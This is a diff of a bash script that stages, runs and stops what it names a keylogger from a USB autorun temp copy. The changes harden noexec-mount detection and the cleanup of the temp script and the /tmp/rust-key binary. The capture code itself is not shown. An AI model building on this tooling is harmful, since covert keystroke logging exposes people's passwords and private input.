@@ -9,7 +9,7 @@ IS_TEMP_SCRIPT="$2"
 
 # Cleanup function for temp script (only cleans up the temp script itself, not the binary)
 cleanup_temp_script() {
-    if [ "$IS_TEMP_SCRIPT" = "from_temp" ] && [ -n "$0" ] && [[ "$0" == /tmp/usb_autorun.* ]]; then
+    if [[ "$IS_TEMP_SCRIPT" = "from_temp" && -n "$0" && "$0" == /tmp/usb_autorun.* ]]; then
         rm -f "$0" 2>/dev/null
     fi
 }
@@ -116,14 +116,26 @@ mkdir -p "$SCRIPT_DIR/logs"
 is_noexec_mount() {
     local file_path="$1"
     local mount_point
-    mount_point=$(df "$file_path" 2>/dev/null | tail -1 | awk '{print $6}')
+    
+    # Try to use --output=target if available, fall back to traditional parsing
+    mount_point=$(df --output=target "$file_path" 2>/dev/null | tail -1)
+    if [ -z "$mount_point" ]; then
+        # Fallback for systems without --output support
+        mount_point=$(df "$file_path" 2>/dev/null | tail -1 | awk '{print $6}')
+    fi
     
     # Check if df succeeded and mount_point is not empty
     if [ -z "$mount_point" ]; then
         return 1  # Can't determine, assume not noexec
     fi
     
-    if mount | grep " $mount_point " | grep -q noexec; then
+    # Verify mount_point is actually a directory
+    if [ ! -d "$mount_point" ]; then
+        return 1  # Invalid mount point, assume not noexec
+    fi
+    
+    # Use -F for literal string matching to avoid regex issues with special characters
+    if mount | grep -F " $mount_point " | grep -q noexec; then
         return 0  # true, is noexec
     fi
     return 1  # false, not noexec
@@ -175,7 +187,7 @@ echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
 if sudo kill $KEYLOGGER_PID 2>/dev/null; then
     echo "✅ Keylogger stopped"
     # Clean up temp binary if it exists
-    if [ -f "$EXEC_PATH" ] && [[ "$EXEC_PATH" == /tmp/rust-key.* ]]; then
+    if [[ -f "$EXEC_PATH" && "$EXEC_PATH" == /tmp/rust-key.* ]]; then
         rm -f "$EXEC_PATH" 2>/dev/null
         echo "✅ Temporary binary cleaned up"
     fi
